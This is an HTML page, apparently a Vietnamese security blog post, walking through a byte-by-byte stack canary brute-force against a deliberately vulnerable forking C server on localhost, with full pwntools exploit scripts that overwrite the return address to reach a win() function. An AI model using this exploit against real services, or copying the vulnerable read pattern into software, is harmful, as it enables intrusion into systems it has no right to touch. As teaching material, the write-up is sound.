@@ -1,0 +1,700 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  data-theme="dark" >
+  <head>
+  <meta charset="utf-8">
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+
+    gtag('config', 'true');
+  </script>
+  <!-- End Google Analytics -->
+
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    Bruteforce Stack Canary x86-64 Linux |
+    
+    whoisthatguy
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Bruteforce Stack Canary x86-64 LinuxGiới thiệuNhư ở bài trước ta đã biết được stack canary là một cơ chế để ngăn chặn buffer overflow. Đây là một giá trị để trước return address và được check trước kh">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bruteforce Stack Canary x86-64 Linux">
+<meta property="og:url" content="http://wh0isthatguy.github.io/2023/04/28/bruteforce-canary/index.html">
+<meta property="og:site_name" content="whoisthatguy">
+<meta property="og:description" content="Bruteforce Stack Canary x86-64 LinuxGiới thiệuNhư ở bài trước ta đã biết được stack canary là một cơ chế để ngăn chặn buffer overflow. Đây là một giá trị để trước return address và được check trước kh">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/60jZiEO.png">
+<meta property="og:image" content="https://i.imgur.com/GMiVnyc.png">
+<meta property="og:image" content="https://i.imgur.com/6ujrdrt.png">
+<meta property="og:image" content="https://bananamafia.dev/img/binary-canary-bruteforce/canary_bruteforce.gif">
+<meta property="og:image" content="https://i.imgur.com/D8B5Usw.png">
+<meta property="og:image" content="https://i.imgur.com/PY2GOVB.png">
+<meta property="og:image" content="https://i.imgur.com/f0gOgFa.png">
+<meta property="og:image" content="https://i.imgur.com/tBUVMVF.png">
+<meta property="og:image" content="https://i.imgur.com/o9TcgVc.png">
+<meta property="og:image" content="https://i.imgur.com/aoHxGyj.png">
+<meta property="article:published_time" content="2023-04-28T09:08:17.000Z">
+<meta property="article:modified_time" content="2024-10-29T09:12:41.089Z">
+<meta property="article:author" content="whoisthatguy">
+<meta property="article:tag" content="linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/60jZiEO.png">
+  
+  
+  
+    <link rel="shortcut icon" href="https://uploads-public.hackmd.io/upload_a391ca5a866f9b0463c380b8e3b6d963.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">UwU....</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="https://i.imgur.com/PY2GOVB.png" alt="Bruteforce Stack Canary x86-64 Linux">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Bruteforce Stack Canary x86-64 Linux</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-bruteforce-canary" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2023/04/28/bruteforce-canary/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2023-04-28T09:08:17.000Z" itemprop="datePublished">2023-04-28</time>
+    <time style="display: none;" id="post-update-time">2024-10-29</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/pwn/" data-aos="zoom-in">pwn</a><a class="article-category-link" href="/categories/pwn/stack-overflow/" data-aos="zoom-in">stack overflow</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="Bruteforce-Stack-Canary-x86-64-Linux"><a href="#Bruteforce-Stack-Canary-x86-64-Linux" class="headerlink" title="Bruteforce Stack Canary x86-64 Linux"></a>Bruteforce Stack Canary x86-64 Linux</h1><h2 id="Gioi-thieu"><a href="#Gioi-thieu" class="headerlink" title="Giới thiệu"></a>Giới thiệu</h2><p>Như ở bài <a target="_blank" rel="noopener" href="https://hackmd.io/OgqVhSZZR3CCszA9GwcrTA">trước</a> ta đã biết được stack canary là một cơ chế để ngăn chặn buffer overflow. Đây là một giá trị để trước return address và được check trước khi return 1 stack frame nhằm tránh overflow. Do đó để chuyển hướng hoạt động của chương trình, ta cần tấn công bằng 1 trong 2 cách sau: leak hoặc bruteforce stack canary. Trong bài này sẽ tấn công bằng cách thứ 2.</p>
+<h2 id="Chuong-trinh-khai-thac"><a href="#Chuong-trinh-khai-thac" class="headerlink" title="Chương trình khai thác"></a>Chương trình khai thác</h2><details>
+<summary>CODE </summary>
+    
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line"></span><br><span class="line">#define PORT 6969</span><br><span class="line">int client = 0  ;</span><br><span class="line"></span><br><span class="line">void vuln(int client_socket) &#123;</span><br><span class="line">    char *output = &quot;vuln read : &quot;;</span><br><span class="line">    char n[10] ;</span><br><span class="line">    send(client_socket, output, strlen(output), 0);</span><br><span class="line">    read(client_socket,n,0x1000);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void win()</span><br><span class="line">&#123;</span><br><span class="line">        send(client,&quot;YOU WIN&quot;,strlen(&quot;YOU WIN&quot;),0) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int server_fd, new_socket, valread;</span><br><span class="line">    struct sockaddr_in address;</span><br><span class="line">    int addrlen = sizeof(address);</span><br><span class="line"></span><br><span class="line">    // Create socket file descriptor</span><br><span class="line">    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) &#123;</span><br><span class="line">        perror(&quot;socket failed&quot;);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Set socket options</span><br><span class="line">    int opt = 1;</span><br><span class="line">    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,</span><br><span class="line">                   &amp;opt, sizeof(opt))) &#123;</span><br><span class="line">        perror(&quot;setsockopt&quot;);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Bind socket to port</span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    if (bind(server_fd, (struct sockaddr *)&amp;address, sizeof(address)) &lt; 0) &#123;</span><br><span class="line">        perror(&quot;bind failed&quot;);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Listen for incoming connections</span><br><span class="line">    if (listen(server_fd, 3) &lt; 0) &#123;</span><br><span class="line">        perror(&quot;listen&quot;);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    while (1) &#123;</span><br><span class="line">        // Accept incoming connection</span><br><span class="line">        if ((new_socket = accept(server_fd, (struct sockaddr *)&amp;address,</span><br><span class="line">                                 (socklen_t *)&amp;addrlen)) &lt; 0) &#123;</span><br><span class="line">            perror(&quot;accept&quot;);</span><br><span class="line">            exit(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Fork a new process to handle the connection</span><br><span class="line">        pid_t pid = fork();</span><br><span class="line">        if (pid &lt; 0) &#123;</span><br><span class="line">            perror(&quot;fork failed&quot;);</span><br><span class="line">            exit(EXIT_FAILURE);</span><br><span class="line">        &#125; else if (pid == 0) &#123;</span><br><span class="line">            // Child process</span><br><span class="line">            close(server_fd);</span><br><span class="line"></span><br><span class="line">            // Call prog function and send output to client</span><br><span class="line">            client = new_socket ;</span><br><span class="line">            vuln(new_socket);</span><br><span class="line">            send(new_socket,&quot;NO OVERFLOW\n&quot;,strlen(&quot;NO OVERFLOW\n&quot;),0);</span><br><span class="line">            close(new_socket);</span><br><span class="line">            exit(EXIT_SUCCESS);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // Parent process</span><br><span class="line">            close(new_socket);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</details>
+
+<p>Giả sử đây là chương trình chạy trên server và được build bằng lệnh <code>gcc -o test test.c -no-pie</code>.</p>
+<p>Đọc code thì ta thấy hướng hoạt động của chương trình trên như sau: chương trình tạo socket cho client kết nối ở <code>localhost 6969</code> (chạy local trên máy) sau đó với mỗi client kết nối nó sẽ <code>fork()</code> chính process này cho client. Ngoài ra ta dễ dàng thấy có lỗi BOF ở <code>vuln</code></p>
+<p>Tiếp theo ta tham khảo hàm <code>fork()</code></p>
+<p><img src="https://i.imgur.com/60jZiEO.png"></p>
+<p>Đây là một syscall trên linux cho phép ta dublicate process gọi nó. Process con sẽ được spawn ra có cùng content với parent. Điều này đồng nghĩa với giá trị stack canary cũng không đổi</p>
+<p><img src="https://i.imgur.com/GMiVnyc.png"></p>
+<p>Do đó ta có thể lợi dụng nó để bruteforce stack canary</p>
+<h2 id="Bruteforce"><a href="#Bruteforce" class="headerlink" title="Bruteforce"></a>Bruteforce</h2><p>Ta biết được canary ở x86-64 là một số 8 byte mà byte cuối luôn tận cùng là <code>/x00</code></p>
+<p><img src="https://i.imgur.com/6ujrdrt.png"></p>
+<p>Do đó sẽ có ít nhất <code>255^7</code> tức <code>70110209207109375</code> giá trị tồn tại. Vì vậy nếu thử từng số thì không biết khi nào mới xong.</p>
+<p>Cho nên ta sẽ sài một hướng khác, và hướng này chính là bruteforces từng byte. Khi ta thử từng byte như vậy, nếu một byte không thoả thì chương trình sẽ exit và báo lỗi, nếu thoả thì chương trình thực thi tiếp và ta sẽ lưu lại byte đó để bruteforce byte kế tiếp.</p>
+<p><img src="https://bananamafia.dev/img/binary-canary-bruteforce/canary_bruteforce.gif"></p>
+<p>Cách này tối ưu hơn vì 1 byte có 255 giá trị, và ta có 7 byte cần bruteforce do đó sẽ có nhiều nhất : <code>255+255+255+255+255+255+255 (1785)</code> lần thử, và nó thấp đáng kể so với cách kia</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Ta đã biết hướng khai thác vậy ta sẽ viết script</p>
+<p>Đầu tiên ta gdb để tìm offset. Do ta cần debug child process sinh ra từ <code>fork()</code> nên ta cần để lệnh này trong gdb</p>
+<p><img src="https://i.imgur.com/D8B5Usw.png"></p>
+<p>Ta nhận thấy ta cần padding 10 byte rồi tới stack canary, sau đó là padding thêm 8 byte, cuối cùng là return address </p>
+<p><img src="https://i.imgur.com/PY2GOVB.png"></p>
+<p>Tiếp theo ta viết script bruteforce bằng python như sau</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">brute_cana</span>():</span><br><span class="line">        p = remote(<span class="string">&quot;localhost&quot;</span>,<span class="number">6969</span>)</span><br><span class="line">        payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">10</span></span><br><span class="line">        canary = <span class="string">&quot;\x00&quot;</span></span><br><span class="line">        <span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">                        leak = <span class="string">b&quot;&quot;</span></span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                                sent = payload + canary + <span class="built_in">chr</span>(i)</span><br><span class="line">                                p.sendafter(<span class="string">b&#x27;vuln read : &#x27;</span>,sent)</span><br><span class="line">                                leak = p.recvline()</span><br><span class="line">                        <span class="keyword">except</span> EOFError:</span><br><span class="line">                                p.close()</span><br><span class="line">                                p.clean()</span><br><span class="line">                                p = remote(<span class="string">&quot;localhost&quot;</span>,<span class="number">6969</span>)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">len</span>(leak) &gt; <span class="number">3</span>) :</span><br><span class="line">                                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Canary =&quot;</span>,<span class="built_in">hex</span>(u64(canary)))</span><br><span class="line">        <span class="keyword">return</span> u64(canary)</span><br></pre></td></tr></table></figure>
+
+<p>Ở đây ta tạo một hàm tên <code>brute_cana</code>, sau đó ta kết nối với host bruteforce từng byte, nếu bị sai ở byte nào thì ta tiến hành kết nối lại và thực hiện tiếp quá trình trên. Ở đây nếu 1 byte bruteforce thành công thì server sẽ send <code>NO OVERFLOW</code> không thì không có gì nên ta lợi dụng nó để biết khi nào làm tiếp byte tiếp theo.</p>
+<p>Tiếp theo ta chạy thử thì được canary.</p>
+<p><img src="https://i.imgur.com/f0gOgFa.png"></p>
+<p>Vậy tới đây ta lo được canary, việc còn lại là overwrite return address bằng ret2libc để lấy shell hay ở đây mình ret2win để minh hoạ.</p>
+<p>Địa chỉ hàm <code>win</code></p>
+<p><img src="https://i.imgur.com/tBUVMVF.png"></p>
+<p>Ở đây ta thấy cần padding 8 byte rồi mới tới ret address<br><img src="https://i.imgur.com/o9TcgVc.png"></p>
+<p>Cuối cùng viết script:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">        p = remote(<span class="string">&quot;localhost&quot;</span>,<span class="number">6969</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span> +p64(brute_cana())+ <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x40134e</span>)</span><br><span class="line"></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;vuln read : &#x27;</span>,payload)</span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Full script:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#exe = ELF(&quot;test&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_cana</span>():</span><br><span class="line">        p = remote(<span class="string">&quot;localhost&quot;</span>,<span class="number">6969</span>)</span><br><span class="line">        payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">10</span></span><br><span class="line">        canary = <span class="string">&quot;\x00&quot;</span></span><br><span class="line">        <span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">                        leak = <span class="string">b&quot;&quot;</span></span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                                sent = payload + canary + <span class="built_in">chr</span>(i)</span><br><span class="line">                                p.sendafter(<span class="string">b&#x27;vuln read : &#x27;</span>,sent)</span><br><span class="line">                                leak = p.recvline()</span><br><span class="line">                        <span class="keyword">except</span> EOFError:</span><br><span class="line">                                p.close()</span><br><span class="line">                                p.clean()</span><br><span class="line">                                p = remote(<span class="string">&quot;localhost&quot;</span>,<span class="number">6969</span>)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">len</span>(leak) &gt; <span class="number">3</span>) :</span><br><span class="line">                                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Canary =&quot;</span>,<span class="built_in">hex</span>(u64(canary)))</span><br><span class="line">        <span class="keyword">return</span> u64(canary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">        p = remote(<span class="string">&quot;localhost&quot;</span>,<span class="number">6969</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span> +p64(brute_cana())+ <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x40134e</span>)</span><br><span class="line"></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;vuln read : &#x27;</span>,payload)</span><br><span class="line">        p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==  <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        get_shell()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>Chạy thử và ta overwrite thành công</p>
+<p><img src="https://i.imgur.com/aoHxGyj.png"></p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://bananamafia.dev/post/binary-canary-bruteforce/">Brute-Forcing x86 Stack Canaries</a></li>
+<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/fork.2.html">Fork linux man page</a></li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="https://hackmd.io/_uploads/SyB-yEs43.png" data-sizes="auto" alt="rand() vulnerability" class="lazyload">
+        
+        <a href="/2023/05/12/rand-vuln/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            rand() vulnerability
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="https://i.imgur.com/l3HfbnG.png" data-sizes="auto" alt="Stack canary - Một cơ chế ngăn chặn Buffer Overflow" class="lazyload">
+      
+      <a href="/2023/04/07/stack-canary/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          Stack canary - Một cơ chế ngăn chặn Buffer Overflow
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Bruteforce-Stack-Canary-x86-64-Linux"><span class="toc-number">1.</span> <span class="toc-text">Bruteforce Stack Canary x86-64 Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Gioi-thieu"><span class="toc-number">1.1.</span> <span class="toc-text">Giới thiệu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chuong-trinh-khai-thac"><span class="toc-number">1.2.</span> <span class="toc-text">Chương trình khai thác</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bruteforce"><span class="toc-number">1.3.</span> <span class="toc-text">Bruteforce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.4.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">1.5.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/../images/avatar.jpg" data-sizes="auto" alt="whoisthatguy" class="lazyload">
+  <div class="sidebar-author-name">whoisthatguy</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">7</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/wh0isthatguy itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://twitter.com/im_whoisthatguy itemprop="url" target="_blank" aria-label="twitter"></a>
+    </div>
+  
+    <div class="icon-discord sidebar-social-icon">
+      <a href=https://discordapp.com/users/wh0isthatguy itemprop="url" target="_blank" aria-label="discord"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
